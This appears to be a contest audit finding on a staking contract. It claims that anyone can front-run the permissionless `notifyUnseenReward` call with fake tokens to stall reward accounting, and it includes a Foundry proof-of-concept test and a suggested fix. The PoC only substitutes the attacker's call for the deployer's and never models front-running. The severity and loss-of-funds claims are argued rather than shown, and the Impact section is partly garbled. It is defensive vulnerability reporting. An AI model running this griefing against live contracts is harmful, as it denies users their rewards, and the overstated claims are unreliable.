# `notifyUnseenReward` can be front-runned indefinitely to cause delay in rewards accrual and effectively dos rewards accrual due to it being time sensitive

## Summary

`notifyUnseenReward` method is permissionless , anyone can call this method .
This method is intended to let the contract know of the transferred rewards so that it can incorporate those rewards into its calculation.

However , an attacker can always front-run the `notifyUnseenReward` method when the transaction gets to mempool,
submit their own `notifyUnseenReward` transaction with fake tokens ( nothing will be updated because the tokens are not valid 
tokens ) with a higher gas price.

### Note

This issue is valid  according to sherlock `Rules Version` [de6519d](https://github.com/sherlock-protocol/sherlock-v2-docs/blob/de6519d1cffad7dbae4b3c7a27e9425adf7be3d2/audits/judging/judging/README.md)

```markdown
The issue impacts the availability of time-sensitive functions . If at least one of these are describing the case, the issue can be a Medium. If both apply, the issue can be considered of High severity

```
As this attack causes the availability attack to the system rewards counting , i believe medium as appropriate severity.


The sponsor's comments assume that front-running can just lead to staking ahead of time and not considered the 

time-sensitive dos of the notify unseen rewards method .


```markdown
The reward tokens will be sent periodically to the staking contract and function notifyUnseenRewards() will be called.

It is acceptable for users to try and front-run the sending of the rewards and staking before hand. Typically this will be taken care of via MEV-blockers, but even if not, it would still be considered acceptable given that the nature of the contract prevents deposits and withdraws in the same transaction.
```
Also the presence of the sentence `but even if not` conveys to the security researcher that protocol might not add

MEV blockers that makes this issue more valid .

At first i thought it was a medium severity issue but as described in my report , it can also cause DoS and Loss of funds

 ( due to no timely updating of rewards and stake and claim happens the attacking day , there will be loss of funds ).

I believe it's a valid High severity issue according to sherlock Rules.

## Vulnerability Detail
Whenever rewards are sent to the lock contract , the contract does not automatically update its accounting 

according to the newly added rewards . Therefore `notifyUnseenReward ` has to be called to update the accounting

however , this method is permissionless

```solidity
    function notifyUnseenReward(address[] memory _rewardTokens) external {
        uint256 length = rewardTokens.length; // Gets the number of reward tokens currently recognized by the contract.
        for (uint256 i = 0; i < length; ++i) {
            if (rewardTokenAdded[_rewardTokens[i]]) {
                _notifyUnseenReward(_rewardTokens[i]); // Processes each token to update any unseen rewards.
            }
        }
    }
```

without the validation , this function can be executed by anyone by passing any tokens array,

If even none of the passed tokens are valid reward tokens , nothing is updated but function call succeeds.

This can be used to abuse the notifying tactic of the protocol by an attacker.

An attacker can keep looking for notify transaction in mempool , when he sees that transaction ,

he front-runs it and submit his own notify transaction with fake tokens array  having a much higher gas price 

for his own transaction and his transaction will be executed and nothing will be updated.

The attacker has to keep front-running the transaction to cause DoS of rewards accounting update.

If we look at the current market `gas price`  it is `4 gwei` which is `~ 0.49$`

If the attacker has just `3667$` , assuming the Ethereum blockchain takes `12 seconds` to mine a new block,

The attacker can completely DoS the system rewards accounting for `an Entire day under 3.7k$ `.

If thousands of people stake or claim on that day , those users will be grieved to only settle for existing rewards and 

cause a loss of funds for those users due to bad accounting.

### PoC

Insert this test in `tests/Deposit.t.sol`

```solidity

 function testDosRewardsAccrual() public {
        // this variable is intened to show the full fledge poc
        // whether you want to see the protocol output with attacker doing the attack
        // or just honest workflow with no attack
        // this will help visualize the difference between the rewards accrual

        bool attackermode = true;

        // Simulating deposits by three different users
        vm.prank(user1);
        lock.stake(100e18, user1, 0);
        vm.prank(user2);
        lock.stake(100e18, user2, 1);
        vm.prank(user3);
        lock.stake(100e18, user3, 2);

        // Distributing rewards to the staking contract
        vm.prank(deployer);
        _rewardToken.transfer(address(lock), 600e18);

        vm.prank(deployer);
        lock.notifyUnseenReward(rewardTokens);

        // Checking that rewards are allocated correctly
        vm.prank(user1);
        lock.getAllRewards();
        assertEq(_rewardToken.balanceOf(user1), 100e18);
        vm.prank(user2);
        lock.getAllRewards();
        assertEq(_rewardToken.balanceOf(user2), 200e18);
        vm.prank(user3);
        lock.getAllRewards();
        assertEq(_rewardToken.balanceOf(user3), 300e18);

        // Now after 23 hours
        vm.warp(block.timestamp + 23 hours);
        // even if 30 days are pased rewards if not notified , users balance will remain as is : Tested âœ…

        // Deployer transfers the amount again and wants to notify the rewards
        vm.prank(deployer);
        _rewardToken.transfer(address(lock), 600e18);

        // rewards tokens are transferred

        // But now he initiates folllowing transaction to notify the rewards
        //         lock.notifyUnseenReward(rewardTokens);

        // however attacker's bot is noticing this transaction in mempool
        // he submits his own transaction with higher gas price with invalid tokens to notify
        // and keeps delaying the notify transaction of the deployer
        // as it just costs gas and currently eth has just 7gwei and other l2s are very cheap

        if (attackermode) {
            address[] memory fakeTokens = new address[](rewardTokens.length);
            for (uint i = 0; i < rewardTokens.length; i++) {
                fakeTokens[i] = vm.addr(i + 60);
            }

            address attacker = vm.addr(50);
            vm.prank(attacker);
            lock.notifyUnseenReward(fakeTokens);
        } else {
            vm.prank(deployer);
            lock.notifyUnseenReward(rewardTokens);
        }

        // now while that transaction is getting delayed ,
        // someone exit their position before or on time
        // and the reward they received is based on the previous multiplier and not the one
        // determined according to new rewards

        // asset statements ensure rewards are same

        if (attackermode) {
            // enabling attacker mode means the rewards will stay same and new transfer of rewards tokens will not be accounted
            // when calculating the rewards

            vm.prank(user1);
            lock.getAllRewards();
            assertEq(_rewardToken.balanceOf(user1), 100e18);
            vm.prank(user2);
            lock.getAllRewards();
            assertEq(_rewardToken.balanceOf(user2), 200e18);
            vm.prank(user3);
            lock.getAllRewards();
            assertEq(_rewardToken.balanceOf(user3), 300e18);
        }
        else{
            // If attacker did not delay our transaction indefinitely , the rewards accrued would have been doubled

            vm.prank(user1);
            lock.getAllRewards();
            assertEq(_rewardToken.balanceOf(user1), 200e18);
            vm.prank(user2);
            lock.getAllRewards();
            assertEq(_rewardToken.balanceOf(user2), 400e18);
            vm.prank(user3);
            lock.getAllRewards();
            assertEq(_rewardToken.balanceOf(user3), 600e18);
        }


        // If rewards are same , test passes
        // it means users will not receive the rewards based on the new rewards rate i.e 1200 rewards tokens instead their rewards are based on 600 tokens

        // The attacker has to keep front-running the transaction of notify to grief other users

    }
```

### PoC Output
The rewards are same as they were before and not accrued.

## Impact
mpacts the availability of time-sensitive notifyUnseenRewards method , and can effectively lead to DoS of `mpacts the availability of time-sensitive ` and cause a loss of funds.

Only allow updation through keeper roles or revert on invalid tokens updation to mitigate this issue.
